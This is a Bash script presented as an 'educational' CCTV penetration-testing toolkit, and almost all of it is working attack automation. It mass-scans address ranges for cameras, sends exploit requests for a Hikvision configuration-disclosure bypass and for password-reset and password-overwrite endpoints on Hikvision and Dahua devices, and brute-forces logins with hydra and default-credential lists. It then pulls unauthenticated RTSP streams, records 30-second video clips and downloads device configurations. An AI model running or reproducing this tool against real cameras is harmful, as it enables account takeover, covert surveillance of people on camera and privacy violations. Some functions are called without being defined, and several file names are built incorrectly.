#!/bin/bash
#
# AutoCCTVPenTest Toolkit - Comprehensive CCTV Security Assessment
# Educational Purpose Only - Use Responsibly
# Author: ATHEX - Cyber Security Researcher
# Version: 2.0
#

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Global variables
TARGET=""
TARGET_FILE=""
OUTPUT_DIR="$(pwd)/cctv_pentest_$(date +%Y%m%d_%H%M%S)"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
THREADS=10
TIMEOUT=10
CCTV_PORTS="80,81,82,83,84,85,86,87,88,89,443,554,8554,8080,8081,8082,8083,8088,8090,8443"
RTSP_PORTS="554,8554,5554,10554"

# Banner
print_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║              AutoCCTVPenTest Toolkit v2.0                        ║
║           Automated CCTV Security Assessment                     ║
║                Educational Purpose Only                          ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}[INFO] Output directory: $OUTPUT_DIR${NC}"
    echo ""
}

# Check dependencies
check_dependencies() {
    echo -e "${YELLOW}[INFO] Checking dependencies...${NC}"
    
    local tools=("nmap" "curl" "ffmpeg" "medusa" "hydra" "rtsp-auth-check" 
                 "sqlmap" "nikto" "whatweb" "dirb" "gobuster" "python3" 
                 "ffplay" "openssl" "john" "crunch")
    
    for tool in "${tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${RED}[ERROR] $tool is not installed${NC}"
            echo -e "${YELLOW}[INFO] Install with: apt install ${tool}${NC}"
            return 1
        fi
    done
    
    # Check Python modules
    local python_modules=("requests" "urllib3" "rtsp" "opencv-python" "scapy")
    
    for module in "${python_modules[@]}"; do
        if ! python3 -c "import $module" &> /dev/null; then
            echo -e "${YELLOW}[INFO] Installing Python module: $module${NC}"
            pip3 install $module
        fi
    done
    
    echo -e "${GREEN}[SUCCESS] All dependencies satisfied${NC}"
    return 0
}

# Setup environment
setup_environment() {
    mkdir -p "$OUTPUT_DIR"/{recon,exploits,credentials,streams,reports}
    echo -e "${GREEN}[SUCCESS] Created output directory: $OUTPUT_DIR${NC}"
    
    # Create custom wordlists
    create_cctv_wordlists
}

# Create CCTV-specific wordlists
create_cctv_wordlists() {
    echo -e "${YELLOW}[INFO] Creating CCTV-specific wordlists...${NC}"
    
    # Common CCTV usernames
    cat > "$OUTPUT_DIR/cctv_users.txt" << EOF
admin
administrator
root
user
guest
supervisor
operator
service
default
support
tech
cctv
security
demo
test
EOF

    # Common CCTV passwords
    cat > "$OUTPUT_DIR/cctv_passwords.txt" << EOF
admin
1234
12345
123456
password
pass
12345678
123456789
888888
666666
111111
admin123
admin1234
password123
secret
1234567890
123
000000
1111
4321
EOF

    # Common CCTV paths
    cat > "$OUTPUT_DIR/cctv_paths.txt" << EOF
/
/admin
/console
/login
/view
/video
/stream
/cgi-bin
/cgi
/web
/webadmin
/operator
/user
/guest
/live
/media
/video.mp4
/axis-cgi/mjpg/video.cgi
/axis-cgi/jpg/image.cgi
/cgi-bin/snapshot.cgi
/img/snapshot.cgi
/cgi-bin/viewer/video.jpg
/videostream.cgi
/snapshot.cgi
/record/current.jpg
/jpg/image.jpg
/jpeg/image.jpg
/image.jpg
EOF

    # RTSP URLs
    cat > "$OUTPUT_DIR/rtsp_urls.txt" << EOF
/stream1
/stream2
/main
/live
/video
/av0
/av1
/ch0
/ch1
/cam0
/cam1
/h264
/mjpeg
/h265
/11
/12
/1
/2
/axis-media/media.amp
/medias2
/mpeg4
EOF

    echo -e "${GREEN}[SUCCESS] Wordlists created${NC}"
}

# Target input
get_target() {
    echo -e "${CYAN}[TARGET SELECTION]${NC}"
    
    if [ -z "$TARGET_FILE" ]; then
        read -p "Enter target IP/range (e.g., 192.168.1.1 or 192.168.1.0/24): " TARGET
        if [ -z "$TARGET" ]; then
            echo -e "${RED}[ERROR] Target is required${NC}"
            exit 1
        fi
    else
        TARGET=$(cat "$TARGET_FILE")
        echo -e "${YELLOW}[INFO] Using targets from file: $TARGET_FILE${NC}"
    fi
}

# Network Discovery
network_discovery() {
    echo -e "${CYAN}[NETWORK DISCOVERY]${NC}"
    echo -e "${YELLOW}[INFO] Scanning for CCTV systems on $TARGET...${NC}"
    
    # Quick port scan for common CCTV ports
    nmap -sS -p $CCTV_PORTS --open -T4 --min-parallelism 100 --min-rate 64 "$TARGET" -oG "$OUTPUT_DIR/recon/port_scan.txt" &> /dev/null
    
    # Extract live hosts
    grep -E "Ports:" "$OUTPUT_DIR/recon/port_scan.txt" | awk '{print $2}' > "$OUTPUT_DIR/recon/live_hosts.txt"
    
    local host_count=$(wc -l < "$OUTPUT_DIR/recon/live_hosts.txt")
    echo -e "${GREEN}[SUCCESS] Found $host_count potential CCTV systems${NC}"
    
    if [ $host_count -gt 0 ]; then
        echo -e "${YELLOW}[INFO] Live hosts:${NC}"
        cat "$OUTPUT_DIR/recon/live_hosts.txt"
    fi
}

# Service Fingerprinting
service_fingerprinting() {
    echo -e "${CYAN}[SERVICE FINGERPRINTING]${NC}"
    
    if [ ! -s "$OUTPUT_DIR/recon/live_hosts.txt" ]; then
        echo -e "${RED}[ERROR] No live hosts found${NC}"
        return
    fi
    
    echo -e "${YELLOW}[INFO] Fingerprinting CCTV services...${NC}"
    
    while IFS= read -r host; do
        echo -e "${BLUE}[SCANNING] $host${NC}"
        
        # Detailed service scan
        nmap -sV -sC -p $CCTV_PORTS --script=http-title,http-headers,rtsp-methods "$host" -oN "$OUTPUT_DIR/recon/service_scan_$host.txt" &> /dev/null &
    done < "$OUTPUT_DIR/recon/live_hosts.txt"
    
    wait
    
    # Parse results
    parse_service_scan
}

# Parse service scan results
parse_service_scan() {
    echo -e "${YELLOW}[INFO] Parsing scan results...${NC}"
    
    echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}                   DETECTED CCTV SYSTEMS                         ${NC}"
    echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
    
    for scan_file in "$OUTPUT_DIR/recon/service_scan_"*.txt; do
        if [ -f "$scan_file" ]; then
            local host=$(echo "$scan_file" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
            local http_title=$(grep -i "http-title" "$scan_file" | head -1 | cut -d: -f2- | sed 's/^ *//')
            local services=$(grep -E "^[0-9]+/(tcp|udp)" "$scan_file" | awk '{print $1 "/" $2 " " $3 " " $4}' | tr '\n' ', ')
            
            echo -e "${BLUE}Host: $host${NC}"
            echo -e "Services: $services"
            echo -e "HTTP Title: $http_title"
            echo "────────────────────────────────────────────────────────────────────"
        fi
    done
}

# Web Interface Discovery
web_interface_discovery() {
    echo -e "${CYAN}[WEB INTERFACE DISCOVERY]${NC}"
    
    if [ ! -s "$OUTPUT_DIR/recon/live_hosts.txt" ]; then
        echo -e "${RED}[ERROR] No live hosts found${NC}"
        return
    fi
    
    echo -e "${YELLOW}[INFO] Discovering web interfaces...${NC}"
    
    while IFS= read -r host; do
        echo -e "${BLUE}[CHECKING] $host${NC}"
        
        # Check common web ports
        for port in 80 81 82 83 84 85 86 87 88 89 443 8080 8081 8082 8083 8088 8090 8443; do
            if timeout 5 curl -s -I "http://$host:$port/" &> /dev/null; then
                echo -e "${GREEN}[FOUND] HTTP service on $host:$port${NC}"
                echo "$host:$port" >> "$OUTPUT_DIR/recon/web_hosts.txt"
                
                # Get page title and headers
                local title=$(timeout 10 curl -s "http://$host:$port/" | grep -i '<title>' | sed 's/<title>\(.*\)<\/title>/\1/I')
                echo "  Title: $title"
                
                # Run whatweb for technology detection
                timeout 30 whatweb "http://$host:$port/" -a 3 > "$OUTPUT_DIR/recon/whatweb_$host_$port.txt" 2>/dev/null &
            fi
        done
    done < "$OUTPUT_DIR/recon/live_hosts.txt"
    
    wait
}

# CCTV Manufacturer Detection
detect_manufacturers() {
    echo -e "${CYAN}[MANUFACTURER DETECTION]${NC}"
    
    if [ ! -f "$OUTPUT_DIR/recon/web_hosts.txt" ]; then
        echo -e "${RED}[ERROR] No web hosts found${NC}"
        return
    fi
    
    echo -e "${YELLOW}[INFO] Detecting CCTV manufacturers...${NC}"
    
    # Common CCTV manufacturer signatures
    declare -A manufacturers=(
        ["Hikvision"]="Hikvision|hik-vision"
        ["Dahua"]="Dahua|dahua-tech"
        ["Axis"]="Axis|AXIS"
        ["Bosch"]="Bosch|BOSCH"
        ["Sony"]="Sony|SNC"
        ["Panasonic"]="Panasonic|Network Camera"
        ["Samsung"]="Samsung|SmartCam"
        ["Vivotek"]="Vivotek|VIVOTEK"
        ["Geovision"]="GeoVision|GV"
        ["Arecont"]="Arecont|AV8185"
        ["Pelco"]="Pelco|PELCO"
        ["Mobotix"]="Mobotix|MOBOTIX"
    )
    
    while IFS= read -r web_host; do
        local host=$(echo "$web_host" | cut -d: -f1)
        local port=$(echo "$web_host" | cut -d: -f2)
        
        for manufacturer in "${!manufacturers[@]}"; do
            local signature="${manufacturers[$manufacturer]}"
            
            if curl -s --connect-timeout 5 "http://$web_host/" | grep -E -i "$signature" &> /dev/null; then
                echo -e "${GREEN}[DETECTED] $manufacturer on $web_host${NC}"
                echo "$web_host:$manufacturer" >> "$OUTPUT_DIR/recon/manufacturers.txt"
                break
            fi
        done
    done < "$OUTPUT_DIR/recon/web_hosts.txt"
}

# Vulnerability Scanning
vulnerability_scanning() {
    echo -e "${CYAN}[VULNERABILITY SCANNING]${NC}"
    
    if [ ! -f "$OUTPUT_DIR/recon/web_hosts.txt" ]; then
        echo -e "${RED}[ERROR] No web hosts found${NC}"
        return
    fi
    
    echo -e "${YELLOW}[INFO] Scanning for common CCTV vulnerabilities...${NC}"
    
    while IFS= read -r web_host; do
        echo -e "${BLUE}[SCANNING] $web_host${NC}"
        
        local host=$(echo "$web_host" | cut -d: -f1)
        local port=$(echo "$web_host" | cut -d: -f2)
        
        # Nikto scan
        timeout 300 nikto -h "http://$web_host/" -output "$OUTPUT_DIR/recon/nikto_$host_$port.txt" -Format txt &> /dev/null &
        
        # Directory brute force
        timeout 300 dirb "http://$web_host/" "$OUTPUT_DIR/cctv_paths.txt" -o "$OUTPUT_DIR/recon/dirb_$host_$port.txt" -S -r &> /dev/null &
        
        # Check for common CCTV vulnerabilities
        check_cctv_vulnerabilities "$host" "$port"
        
    done < "$OUTPUT_DIR/recon/web_hosts.txt"
    
    wait
    echo -e "${GREEN}[SUCCESS] Vulnerability scanning completed${NC}"
}

# Check specific CCTV vulnerabilities
check_cctv_vulnerabilities() {
    local host=$1
    local port=$2
    local base_url="http://$host:$port"
    
    echo -e "${YELLOW}[CHECKING VULNERABILITIES] $host:$port${NC}"
    
    # Hikvision vulnerabilities
    check_hikvision_vulns "$host" "$port"
    
    # Dahua vulnerabilities
    check_dahua_vulns "$host" "$port"
    
    # Axis vulnerabilities
    check_axis_vulns "$host" "$port"
    
    # Generic vulnerabilities
    check_generic_vulns "$host" "$port"
}

# Hikvision vulnerabilities
check_hikvision_vulns() {
    local host=$1
    local port=$2
    
    # Hikvision backdoor (CVE-2017-7921)
    if curl -s --connect-timeout 5 "http://$host:$port/System/configurationFile?auth=YWRtaW46MTEK" | file - | grep -q "data"; then
        echo -e "${RED}[VULNERABLE] Hikvision CVE-2017-7921 on $host:$port${NC}"
        echo "CVE-2017-7921: Configuration file disclosure" >> "$OUTPUT_DIR/exploits/vulnerabilities.txt"
        
        # Download configuration file
        curl -s "http://$host:$port/System/configurationFile?auth=YWRtaW46MTEK" -o "$OUTPUT_DIR/exploits/hikvision_config_$host.xml"
    fi
    
    # Hikvision password reset
    if curl -s --connect-timeout 5 -X PUT "http://$host:$port/Security/users/1/resetPassword" | grep -q "success"; then
        echo -e "${RED}[VULNERABLE] Hikvision password reset on $host:$port${NC}"
        echo "Password reset vulnerability" >> "$OUTPUT_DIR/exploits/vulnerabilities.txt"
    fi
}

# Dahua vulnerabilities
check_dahua_vulns() {
    local host=$1
    local port=$2
    
    # Dahua backdoor (CVE-2021-33044)
    if curl -s --connect-timeout 5 "http://$host:$port/cgi-bin/magicBox.cgi?action=getSystemInfo" | grep -q "model"; then
        echo -e "${RED}[VULNERABLE] Dahua information disclosure on $host:$port${NC}"
        echo "Dahua information disclosure" >> "$OUTPUT_DIR/exploits/vulnerabilities.txt"
    fi
    
    # Dahua password reset
    if curl -s --connect-timeout 5 "http://$host:$port/cgi-bin/configManager.cgi?action=setConfig&User&Name=admin&Password=admin" | grep -q "OK"; then
        echo -e "${RED}[VULNERABLE] Dahua password reset on $host:$port${NC}"
        echo "Dahua password reset" >> "$OUTPUT_DIR/exploits/vulnerabilities.txt"
    fi
}

# Axis vulnerabilities
check_axis_vulns() {
    local host=$1
    local port=$2
    
    # Axis VAPIX vulnerabilities
    if curl -s --connect-timeout 5 "http://$host:$port/axis-cgi/admin/param.cgi?action=list" | grep -q "root"; then
        echo -e "${RED}[VULNERABLE] Axis VAPIX param.cgi on $host:$port${NC}"
        echo "Axis VAPIX param.cgi exposure" >> "$OUTPUT_DIR/exploits/vulnerabilities.txt"
    fi
}

# Generic vulnerabilities
check_generic_vulns() {
    local host=$1
    local port=$2
    
    # Check for default credentials
    check_default_credentials "$host" "$port"
    
    # Check for directory listings
    check_directory_listings "$host" "$port"
    
    # Check for RTSP unauthorized access
    check_rtsp_access "$host"
}

# Credential Attacks
credential_attacks() {
    echo -e "${CYAN}[CREDENTIAL ATTACKS]${NC}"
    
    if [ ! -f "$OUTPUT_DIR/recon/web_hosts.txt" ]; then
        echo -e "${RED}[ERROR] No web hosts found${NC}"
        return
    fi
    
    echo -e "${YELLOW}[INFO] Starting credential attacks...${NC}"
    
    while IFS= read -r web_host; do
        echo -e "${BLUE}[ATTACKING] $web_host${NC}"
        
        local host=$(echo "$web_host" | cut -d: -f1)
        local port=$(echo "$web_host" | cut -d: -f2)
        
        # Try default credentials first
        check_default_credentials "$host" "$port"
        
        # If defaults fail, try brute force
        brute_force_login "$host" "$port"
        
    done < "$OUTPUT_DIR/recon/web_hosts.txt"
}

# Check default credentials
check_default_credentials() {
    local host=$1
    local port=$2
    
    echo -e "${YELLOW}[CHECKING DEFAULTS] $host:$port${NC}"
    
    # Common default credential pairs
    declare -A creds=(
        ["admin:admin"]="Basic YWRtaW46YWRtaW4="
        ["admin:1234"]="Basic YWRtaW46MTIzNA=="
        ["admin:12345"]="Basic YWRtaW46MTIzNDU="
        ["admin:123456"]="Basic YWRtaW46MTIzNDU2"
        ["admin:password"]="Basic YWRtaW46cGFzc3dvcmQ="
        ["admin:"]="Basic YWRtaW46"
        ["root:root"]="Basic cm9vdDpyb290"
        ["admin:admin123"]="Basic YWRtaW46YWRtaW4xMjM="
    )
    
    for cred in "${!creds[@]}"; do
        local user=$(echo "$cred" | cut -d: -f1)
        local pass=$(echo "$cred" | cut -d: -f2)
        local auth="${creds[$cred]}"
        
        if curl -s --connect-timeout 5 -H "Authorization: $auth" "http://$host:$port/" | grep -q -i -E "(dashboard|admin|console|video)"; then
            echo -e "${GREEN}[SUCCESS] Default credentials found: $user:$pass on $host:$port${NC}"
            echo "$host:$port:$user:$pass" >> "$OUTPUT_DIR/credentials/found_credentials.txt"
            return 0
        fi
    done
    
    return 1
}

# Brute force login
brute_force_login() {
    local host=$1
    local port=$2
    
    echo -e "${YELLOW}[BRUTE FORCE] $host:$port${NC}"
    
    # Try hydra with common CCTV credentials
    timeout 600 hydra -L "$OUTPUT_DIR/cctv_users.txt" -P "$OUTPUT_DIR/cctv_passwords.txt" \
        "$host" http-get "/" -s "$port" -t $THREADS -f -o "$OUTPUT_DIR/credentials/hydra_$host_$port.txt" &> /dev/null
    
    if grep -q "login:" "$OUTPUT_DIR/credentials/hydra_$host_$port.txt"; then
        local found_creds=$(grep "login:" "$OUTPUT_DIR/credentials/hydra_$host_$port.txt")
        echo -e "${GREEN}[SUCCESS] Brute force successful: $found_creds${NC}"
        echo "$host:$port:$found_creds" >> "$OUTPUT_DIR/credentials/found_credentials.txt"
    fi
}

# RTSP Discovery and Access
rtsp_discovery() {
    echo -e "${CYAN}[RTSP DISCOVERY]${NC}"
    
    if [ ! -s "$OUTPUT_DIR/recon/live_hosts.txt" ]; then
        echo -e "${RED}[ERROR] No live hosts found${NC}"
        return
    fi
    
    echo -e "${YELLOW}[INFO] Discovering RTSP streams...${NC}"
    
    while IFS= read -r host; do
        echo -e "${BLUE}[SCANNING] $host${NC}"
        
        # Scan for RTSP ports
        for rtsp_port in $(echo $RTSP_PORTS | tr ',' ' '); do
            if nc -z -w 1 "$host" "$rtsp_port" &> /dev/null; then
                echo -e "${GREEN}[FOUND] RTSP service on $host:$rtsp_port${NC}"
                echo "$host:$rtsp_port" >> "$OUTPUT_DIR/recon/rtsp_hosts.txt"
                
                # Try to access RTSP streams
                probe_rtsp_streams "$host" "$rtsp_port"
            fi
        done
    done < "$OUTPUT_DIR/recon/live_hosts.txt"
}

# Probe RTSP streams
probe_rtsp_streams() {
    local host=$1
    local port=$2
    
    echo -e "${YELLOW}[PROBING RTSP] $host:$port${NC}"
    
    while IFS= read -r rtsp_path; do
        local rtsp_url="rtsp://$host:$port$rtsp_path"
        
        # Check if stream is accessible without auth
        if timeout 10 ffprobe -loglevel error "$rtsp_url" &> /dev/null; then
            echo -e "${GREEN}[SUCCESS] Unauthenticated RTSP: $rtsp_url${NC}"
            echo "$rtsp_url" >> "$OUTPUT_DIR/streams/accessible_streams.txt"
            
            # Capture snapshot
            capture_rtsp_snapshot "$rtsp_url" "$host"
        else
            # Try with default credentials
            for cred in "admin:admin" "admin:1234" ":"; do
                local auth_rtsp_url="rtsp://$cred@$host:$port$rtsp_path"
                if timeout 10 ffprobe -loglevel error "$auth_rtsp_url" &> /dev/null; then
                    echo -e "${GREEN}[SUCCESS] RTSP with credentials: $auth_rtsp_url${NC}"
                    echo "$auth_rtsp_url" >> "$OUTPUT_DIR/streams/accessible_streams.txt"
                    capture_rtsp_snapshot "$auth_rtsp_url" "$host"
                    break
                fi
            done
        fi
    done < "$OUTPUT_DIR/rtsp_urls.txt"
}

# Capture RTSP snapshot
capture_rtsp_snapshot() {
    local rtsp_url=$1
    local host=$2
    
    local snapshot_file="$OUTPUT_DIR/streams/snapshot_${host}_$(date +%s).jpg"
    
    if timeout 15 ffmpeg -loglevel quiet -i "$rtsp_url" -vframes 1 -q:v 2 "$snapshot_file" &> /dev/null; then
        echo -e "${GREEN}[SNAPSHOT] Captured: $snapshot_file${NC}"
    fi
}

# Stream Capture and Recording
stream_capture() {
    echo -e "${CYAN}[STREAM CAPTURE]${NC}"
    
    if [ ! -f "$OUTPUT_DIR/streams/accessible_streams.txt" ]; then
        echo -e "${RED}[ERROR] No accessible streams found${NC}"
        return
    fi
    
    echo -e "${YELLOW}[INFO] Starting stream capture...${NC}"
    
    local capture_duration=30  # seconds
    
    while IFS= read -r stream_url; do
        echo -e "${BLUE}[CAPTURING] $stream_url${NC}"
        
        local filename=$(echo "$stream_url" | sed 's/[^a-zA-Z0-9]/_/g')
        local output_file="$OUTPUT_DIR/streams/capture_${filename}_$(date +%s).mp4"
        
        # Capture short video clip
        timeout $((capture_duration + 5)) ffmpeg -loglevel quiet -i "$stream_url" -t $capture_duration -c copy "$output_file" &
        
        echo -e "${GREEN}[RECORDING] Saving to: $output_file${NC}"
        
    done < "$OUTPUT_DIR/streams/accessible_streams.txt"
    
    wait
    echo -e "${GREEN}[SUCCESS] Stream capture completed${NC}"
}

# Exploitation Module
exploitation_module() {
    echo -e "${CYAN}[EXPLOITATION MODULE]${NC}"
    
    if [ ! -f "$OUTPUT_DIR/credentials/found_credentials.txt" ]; then
        echo -e "${RED}[ERROR] No credentials found for exploitation${NC}"
        return
    fi
    
    echo -e "${YELLOW}[INFO] Starting exploitation phase...${NC}"
    
    while IFS= read -r cred_line; do
        local host=$(echo "$cred_line" | cut -d: -f1)
        local port=$(echo "$cred_line" | cut -d: -f2)
        local user=$(echo "$cred_line" | cut -d: -f3)
        local pass=$(echo "$cred_line" | cut -d: -f4)
        
        echo -e "${BLUE}[EXPLOITING] $host:$port with $user:$pass${NC}"
        
        # Download configuration files
        download_configs "$host" "$port" "$user" "$pass"
        
        # Access video streams
        access_video_streams "$host" "$port" "$user" "$pass"
        
        # System information gathering
        gather_system_info "$host" "$port" "$user" "$pass"
        
    done < "$OUTPUT_DIR/credentials/found_credentials.txt"
}

# Download configuration files
download_configs() {
    local host=$1
    local port=$2
    local user=$3
    local pass=$4
    
    local auth="$(echo -n "$user:$pass" | base64)"
    
    # Try common configuration file paths
    local config_paths=(
        "/System/configurationFile"
        "/config/config.json"
        "/cgi-bin/config"
        "/backup/config.bak"
        "/db/configuration.db"
    )
    
    for path in "${config_paths[@]}"; do
        if curl -s -H "Authorization: Basic $auth" "http://$host:$port$path" -o "$OUTPUT_DIR/exploits/config_${host}${path//\//_}" &> /dev/null; then
            if [ -s "$OUTPUT_DIR/exploits/config_${host}${path//\//_}" ]; then
                echo -e "${GREEN}[CONFIG] Downloaded: $path from $host${NC}"
            fi
        fi
    done
}

# Access video streams
access_video_streams() {
    local host=$1
    local port=$2
    local user=$3
    local pass=$4
    
    echo -e "${YELLOW}[ACCESSING STREAMS] $host${NC}"
    
    # Try to access live video streams
    local video_urls=(
        "/video.mp4"
        "/live"
        "/stream"
        "/axis-cgi/mjpg/video.cgi"
        "/cgi-bin/viewer/video.jpg"
        "/videostream.cgi"
    )
    
    for video_url in "${video_urls[@]}"; do
        local full_url="http://$user:$pass@$host:$port$video_url"
        
        if curl -s -I "$full_url" | grep -q "200 OK"; then
            echo -e "${GREEN}[STREAM] Accessible: $video_url${NC}"
            echo "$full_url" >> "$OUTPUT_DIR/streams/authenticated_streams.txt"
        fi
    done
}

# Gather system information
gather_system_info() {
    local host=$1
    local port=$2
    local user=$3
    local pass=$4
    
    local auth="$(echo -n "$user:$pass" | base64)"
    
    # Try to get system information
    local info_urls=(
        "/System/deviceInfo"
        "/cgi-bin/param.cgi?action=list"
        "/status"
        "/system"
        "/info"
    )
    
    for info_url in "${info_urls[@]}"; do
        if curl -s -H "Authorization: Basic $auth" "http://$host:$port$info_url" -o "$OUTPUT_DIR/exploits/info_${host}${info_url//\//_}" &> /dev/null; then
            if [ -s "$OUTPUT_DIR/exploits/info_${host}${info_url//\//_}" ]; then
                echo -e "${GREEN}[INFO] System info: $info_url from $host${NC}"
            fi
        fi
    done
}

# Generate Report
generate_report() {
    echo -e "${CYAN}[GENERATING REPORT]${NC}"
    
    local report_file="$OUTPUT_DIR/reports/cctv_pentest_report_$(date +%Y%m%d_%H%M%S).html"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>CCTV Penetration Test Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .header { background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }
        .section { margin: 20px 0; padding: 15px; border-left: 4px solid #3498db; background: #f8f9fa; }
        .vulnerability { color: #e74c3c; font-weight: bold; }
        .success { color: #27ae60; }
        .warning { color: #f39c12; }
        .credential { background: #fff3cd; padding: 10px; margin: 5px 0; border-radius: 3px; }
        .stream { background: #d1ecf1; padding: 10px; margin: 5px 0; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>CCTV Penetration Test Report</h1>
        <p>Generated: $(date)</p>
        <p>Target: $TARGET</p>
    </div>
    
    <div class="section">
        <h2>Executive Summary</h2>
        <p>Assessment of CCTV systems for security vulnerabilities and unauthorized access.</p>
    </div>
    
    <div class="section">
        <h2>Discovered Systems</h2>
EOF

    # Add discovered hosts
    if [ -f "$OUTPUT_DIR/recon/live_hosts.txt" ]; then
        while IFS= read -r host; do
            echo "<p>• $host</p>" >> "$report_file"
        done < "$OUTPUT_DIR/recon/live_hosts.txt"
    fi

    cat >> "$report_file" << EOF
    </div>
    
    <div class="section">
        <h2>Found Credentials</h2>
EOF

    # Add found credentials
    if [ -f "$OUTPUT_DIR/credentials/found_credentials.txt" ]; then
        while IFS= read -r cred; do
            echo "<div class='credential'>$cred</div>" >> "$report_file"
        done < "$OUTPUT_DIR/credentials/found_credentials.txt"
    fi

    cat >> "$report_file" << EOF
    </div>
    
    <div class="section">
        <h2>Accessible Streams</h2>
EOF

    # Add accessible streams
    if [ -f "$OUTPUT_DIR/streams/accessible_streams.txt" ]; then
        while IFS= read -r stream; do
            echo "<div class='stream'>$stream</div>" >> "$report_file"
        done < "$OUTPUT_DIR/streams/accessible_streams.txt"
    fi

    cat >> "$report_file" << EOF
    </div>
    
    <div class="section">
        <h2>Vulnerabilities Found</h2>
EOF

    # Add vulnerabilities
    if [ -f "$OUTPUT_DIR/exploits/vulnerabilities.txt" ]; then
        while IFS= read -r vuln; do
            echo "<p class='vulnerability'>$vuln</p>" >> "$report_file"
        done < "$OUTPUT_DIR/exploits/vulnerabilities.txt"
    fi

    cat >> "$report_file" << EOF
    </div>
    
    <div class="section">
        <h2>Recommendations</h2>
        <ul>
            <li>Change default credentials immediately</li>
            <li>Update firmware to latest versions</li>
            <li>Disable unnecessary services (RTSP, Telnet)</li>
            <li>Implement network segmentation</li>
            <li>Use VPN for remote access</li>
            <li>Regular security audits</li>
        </ul>
    </div>
</body>
</html>
EOF

    echo -e "${GREEN}[SUCCESS] Report generated: $report_file${NC}"
}

# Main execution function
main() {
    print_banner
    check_dependencies || exit 1
    setup_environment
    get_target
    
    echo -e "${CYAN}[STARTING CCTV PENETRATION TEST]${NC}"
    
    # Phase 1: Discovery
    network_discovery
    service_fingerprinting
    web_interface_discovery
    detect_manufacturers
    
    # Phase 2: Vulnerability Assessment
    vulnerability_scanning
    rtsp_discovery
    
    # Phase 3: Credential Attacks
    credential_attacks
    
    # Phase 4: Exploitation
    exploitation_module
    stream_capture
    
    # Phase 5: Reporting
    generate_report
    
    echo -e "${GREEN}[COMPLETE] CCTV penetration test finished${NC}"
    echo -e "${YELLOW}[INFO] Results saved to: $OUTPUT_DIR${NC}"
}

# Python RTSP Scanner (additional tool)
create_rtsp_scanner() {
    cat > "$OUTPUT_DIR/rtsp_scanner.py" << 'EOF'
#!/usr/bin/env python3
import socket
import concurrent.futures
import sys

def check_rtsp(host, port=554):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

def scan_rtsp(hosts):
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        future_to_host = {executor.submit(check_rtsp, host): host for host in hosts}
        for future in concurrent.futures.as_completed(future_to_host):
            host = future_to_host[future]
            try:
                if future.result():
                    print(f"RTSP found on {host}:554")
            except Exception as exc:
                print(f'{host} generated an exception: {exc}')

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 rtsp_scanner.py <target_file>")
        sys.exit(1)
    
    with open(sys.argv[1], 'r') as f:
        hosts = [line.strip() for line in f]
    
    scan_rtsp(hosts)
EOF
    chmod +x "$OUTPUT_DIR/rtsp_scanner.py"
}

# Usage information
usage() {
    echo "AutoCCTVPenTest Toolkit v2.0"
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "OPTIONS:"
    echo "  -t <target>      Target IP/range (e.g., 192.168.1.1 or 192.168.1.0/24)"
    echo "  -f <file>        File containing target list"
    echo "  -o <output>      Output directory"
    echo "  -h               Show this help message"
    echo ""
    echo "EXAMPLES:"
    echo "  $0 -t 192.168.1.100"
    echo "  $0 -f targets.txt"
    echo "  $0 -t 192.168.1.0/24 -o /tmp/cctv_scan"
    echo ""
}

# Parse command line arguments
while getopts "t:f:o:h" opt; do
    case $opt in
        t)
            TARGET="$OPTARG"
            ;;
        f)
            TARGET_FILE="$OPTARG"
            ;;
        o)
            OUTPUT_DIR="$OPTARG"
            ;;
        h)
            usage
            exit 0
            ;;
        \?)
            echo "Invalid option: -$OPTARG" >&2
            usage
            exit 1
            ;;
    esac
done

# Create RTSP scanner tool
create_rtsp_scanner

# Start main function
if [ $# -eq 0 ]; then
    main
else
    if [ -z "$TARGET" ] && [ -z "$TARGET_FILE" ]; then
        echo -e "${RED}[ERROR] Target is required${NC}"
        usage
        exit 1
    fi
    main
fi